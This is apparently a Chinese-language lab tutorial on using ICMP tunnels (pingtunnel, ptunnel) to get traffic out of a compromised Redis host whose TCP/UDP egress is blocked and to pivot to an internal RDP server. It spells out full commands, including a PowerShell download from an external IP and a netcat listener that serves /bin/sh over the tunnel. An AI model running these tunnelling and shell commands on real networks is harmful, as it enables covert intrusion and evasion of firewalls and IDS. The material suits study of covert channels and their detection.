

# 0x01 ICMP 隧道使用场景


两台机器间，除了允许 icmp 通信（单向或互相 ping），其他的 tcp/udp 端口一律不允许，此时我们就可考虑利用 icmp 隧道进行穿透。

![title](https://leanote.com/api/file/getImage?fileId=5ed7610dab64416dde000885)

利用 icmp 隧道轻松穿透 tcp/udp 四层封锁。


实现的 ICMP 隧道的一些工具，如：

- icmpsh
- PingTunnel
- icmptunnel
- powershell icmp
- ......

我本以为工具就是工具，随便选一个就可以。但其实不是这样。上面这些不同的 ICMP 隧道工具适用于不同的场景，需要根据不同的网络环境进行选择使用。当然，自己写可能是最好的......




# 0x02 实验1：失陷机器单向 ICMP 出网

**网络拓扑：**


![title](https://leanote.com/api/file/getImage?fileId=5ed6e364ab64416dde00024c)

注：这里 redis 没有公网 IP 也可以（其实是我手误配出来一个公网 IP）。此实验中，攻击者控下 ICMP 跳板机的方式是 Redis 拿 shell。其他可能的一些方式如 FTP、MS SQL 拿 Shell......

**连通性测试：**



redis 机器只有 icmp 出网：

```
powershell -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://47.244.96.168:8888/readme.txt','readme.txt')
```

![title](https://leanote.com/api/file/getImage?fileId=5ed65aaaab644127c2001b3c)


![title](https://leanote.com/api/file/getImage?fileId=5ed65aebab644125c1001ada)

**隧道搭建工具：**

- [pingtunnel](https://github.com/esrrhs/pingtunnel)


开始搭建 ICMP 隧道：

>注：
>
attack 和 redis 谁是 client 端，谁是 server 端呢？
因为现在：
>
- redis 可以 ping 通 attack 机器
- attack 机器无法 ping 通 redis 机器
>
所以很容易理解，attack 机器应该作 icmp 隧道的 server 端，等待连接。redis 机器应该作 icmp 隧道的 client 端，主动去连接 attack 机器。


attack 机器上开启 ICMP 服务端：

```
sudo wget https://github.com/esrrhs/pingtunnel/releases/download/2.2/pingtunnel_linux64.zip
sudo unzip pingtunnel_linux64.zip
echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all  #关闭系统默认的 ping（可选）
sudo ./pingtunnel -type server -key 457864
```


注：服务端参数 `-key` 用于设置密码，默认0。



![title](https://leanote.com/api/file/getImage?fileId=5ed65f56ab644127c2001b61)



然后就开始了等待连接。


redis 机器上开启 ICMP 客户端：

```
pingtunnel.exe -type client -l :4455 -s 47.244.96.168 -t 47.244.96.168:8888 -tcp 1 -key 457864
```

注：

```
客户端参数:
-l        本地的地址，发到这个端口的流量将转发到服务器
-s        服务器的地址，流量将通过隧道转发到这个服务器
-t        远端服务器转发的目的地址，流量将转发到这个地址
-key      设置的密码，默认0
```


上面这句命令的意思是：监听本地的 4455 端口，发送到4455端口的流量将通过 ICMP 隧道转发到 47.244.96.168 服务器的 8888 端口。

![title](https://leanote.com/api/file/getImage?fileId=5ed6725aab644127c2001c22)


可以看到，attack 机器已经收到了来自 redis 机器的 ping，至此隧道搭建成功。

![title](https://leanote.com/api/file/getImage?fileId=5ed6e54eab64416be10002a9)

使用上，比如使用 nc 进行双方的通信。attack 机器上在本地 8888 端口开启一个 nc 服务端，同样等待连接：

```
busybox nc -lp 8888 -e /bin/sh
```

![title](https://leanote.com/api/file/getImage?fileId=5ed6e097ab64416be100027f)

redis 机器上使用 nc 监听本地的 4455 端口，开启 nc 客户端：

```
nc.exe -nv 127.0.0.1 4455
```

![title](https://leanote.com/api/file/getImage?fileId=5ed6e0aeab64416be1000280)


这样双方可以互传文件：


![title](https://leanote.com/api/file/getImage?fileId=5ed6e232ab64416be100028f)

![title](https://leanote.com/api/file/getImage?fileId=5ed6e24aab64416dde000243)


关于 nc 方向的问题，主要因为 ping 的单方向能 ping 通，所以 attack 机器只能等待连接。ICMP 本身就是一个不太稳定的隧道，加上一直在发 ping 命令包，容易引起流量监控设备的注意，如果想把它作为稳定的隧道去执行命令，不太现实，偶尔用来传个东西，还可以。



# 0x03 实验2：失陷机器和攻击机器 ICMP 互通




**网络拓扑：**

![title](https://leanote.com/api/file/getImage?fileId=5ed7548eab64416dde0007f6)


| hostname     |IP| 备注 |OS|
| :-------- | :--------| :-- |:-- |
| attack | 47.56.164.121 |  入侵者的攻击机器   |Ubuntu 18.04|
| Redis  |  182.92.218.198（公） 172.17.185.194（内）|  被控 linux 机器，即 icmp 跳板机	|Ubuntu 18.04|
| internal      |    172.17.185.196| 为目标 Windows 机器，开启了3389  |Windows Server 2008 R2|



注：此实验中，攻击者控下 ICMP 跳板机的方式是 Redis 拿 shell。其他可能的一些方式如 FTP、MS SQL 拿 Shell......

**连通性测试：**


- redis 机器连通性测试：


![title](https://leanote.com/api/file/getImage?fileId=5ed75640ab64416dde000807)



![title](https://leanote.com/api/file/getImage?fileId=5ed75686ab64416dde00080a)


redis 机器 TCP/UDP 协议不出网，唯有 icmp 协议出网；
redis 机器可以 ping 通攻击机器，攻击机器也可以 ping 通 redis（实际中 ICMP 也很少有双向通的）。

- internal 机器连通性测试：


![title](https://leanote.com/api/file/getImage?fileId=5ed5e01cab644125c100152e)

**攻击目标：**

- 网络分析

    - attack 机器想访问 internal 机器的3389，由于 internal 机器开了防火墙且做了 ip 限制，没法直接从 attack 上进行访问。
    - redis 机器跟 internal 机器之间可以通 3389 的 TCP 流量。
    - 虽然 redis 机器开启了防火墙，但好在 redis 机器能 ping 通 attack 机器，即没有阻断它们之间的 icmp 通信，也就是可以 icmp 出网。并且 attack 机器也能 ping 通 redis，双方互通，虽然这种在实际场景中不太常见。

- 最终目的

    - 让 redis 机器作为 icmp 跳板，通过访问 attack 机器的指定端口来转发到 internal 机器的3389上。
    - 实现的最终效果，即访问 attack 机器的指定端口就相当于访问 internal 机器的3389端口。
    
    
    
![title](https://leanote.com/api/file/getImage?fileId=5ed5e46eab644125c100155e)

**隧道搭建工具：**

[Ping Tunnel](http://www.cs.uit.no/~daniels/PingTunnel/)





快速编译安装 Ping Tunnel（测试 OS ubuntu）：



```
# 安装依赖环境
apt install libpcap-dev flex bison -y

#安装Ping Tunnel
wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
tar -xzvf PingTunnel-0.72.tar.gz
cd PingTunnel
make && make install
```



redis 机器上，开启 ICMP 隧道<u>服务端</u>，等待连接：


```
./ptunnel

```




attack 机器上，开启 ICMP 隧道<u>客户端</u>：



```
./ptunnel -p 182.92.218.198 -lp 1080 -da 172.17.185.196 -dp 3389
```

注：

```
客户端参数:
-p 	    指定 ICMP 跳板机 IP
-l 	    指定本地转发端口
-da 	指定最终要访问的机器 IP
-dp 	指定最终要访问的机器端口，如：ssh、rdp、database......
示例用法:
./ptunnel -p <代理地址> -lp <监听端口> -da <目标地址> -dp <目标端口> [-c <网络设备>] [-v <详细程度>] [-f <日志文件> ] [-u] [-x密码]
```

上面那行客户端命令的意思是：以 Redis 作为 ICMP 隧道跳板，当外部来访问攻击机器本机的1080端口时就相当于进入了刚刚打通的 ICMP 隧道，然后把到目的 IP internal 机器的指定端口即3389端口的数据都封装到这个隧道里面进行传送。



然后隧道就搭建完成。

![title](https://leanote.com/api/file/getImage?fileId=5ed7674fab64416dde0008d9)


在本地 windows 上远程连接 internal 机器的 3389：

![title](https://leanote.com/api/file/getImage?fileId=5ed758faab64416dde000826)




这个方案的可行性在于：

1. attack 和 redis 是 ICMP 可通的
从 attack 去访问 internal 机器的3389，实质上是 tcp 包，但是经过 ICMP 隧道的封装，就把数据包封装在 ICMP 包中进行传输。因为 ping 协议一般是出网限制，主要为了绕过路由或者防火墙。
2. redis 机器到 internal 机器是 tcp 可达的
中间经过 redis 机器，内网目标机器还是内网信任可以 tcp 的，redis 机器到 internal 机器是 tcp 可达的。如果 redis 机器到 internal 机器无法 tcp 过去，那么 attack 绝无可能访问到 internal 机器的 3389。

# 0x04 总结

当对已控机器进行连通性测试，发现除了允许 ICMP 出网，其他的 tcp/udp 端口一律不允许，此时我们就可考虑利用 icmp 隧道进行穿透。


ICMP 出网分两种情况：

1. 失陷机器单向 ICMP 出网
- 即失陷机器可以 ping 通攻击机器，攻击机器无法 ping 通失陷机器。这是大多数真实场景中的情况，这种情况下攻击机器不能主动发消息，只能通过回包来传数据。

2. 失陷机器和攻击机器 ICMP 互通

在本文中分别使用两种工具对这两种情况作了利用 ICMP 隧道传输数据的实验。




ICMP 其实跟端口无关，也就是说根本不需要失陷机器开任何端口，仅仅只需要能正常 ping 通，就可以进行 ICMP 隧道穿透。

但是要注意：利用 ICMP 隧道进行数据传输的话，会造成 ICMP 请求过于密集，很容易触发各种 IDS，我们搭建隧道追求的是隐蔽性、可操作性、容易上手、速度好、稳定，所以 ICMP 隧道并不是特别好和稳的选择，当然有别的出网、通信方式也不至于用这个，也是不得已而为之。

----------


# 参考文档：

1. [pingtunnel](https://github.com/esrrhs/pingtunnel)，实验1单向 ICMP 出网中使用的工具
2. [Ping Tunnel](http://www.cs.uit.no/~daniels/PingTunnel/)，实验二，双向 ICMP 互通中使用的工具
3. [利用icmp隧道轻松穿透tcp/udp四层封锁](https://klionsec.github.io/2017/10/31/icmp-tunnel/)，Klion's blog，Klion，2017-10-31 
4. [内网渗透（七） |内网转发及隐蔽隧道：网络层隧道技术之ICMP隧道(pingTunnel/IcmpTunnel)](https://mp.weixin.qq.com/s/P0poHF2ySMCDeeEdO4p1iw)，安全加，谢公子
5. [隐藏通信隧道技术](https://wuhash.com/2020-05-27.html?from=timeline#more)，在学安全的路上，伍默，2020年5月28日
6. 硬核老铁可以参考小葵哥的文章自撸 ICMP 隧道工具：[Go 发送ICMP包](https://zhuanlan.zhihu.com/p/82137276)，知乎，于小葵，2019-09-11
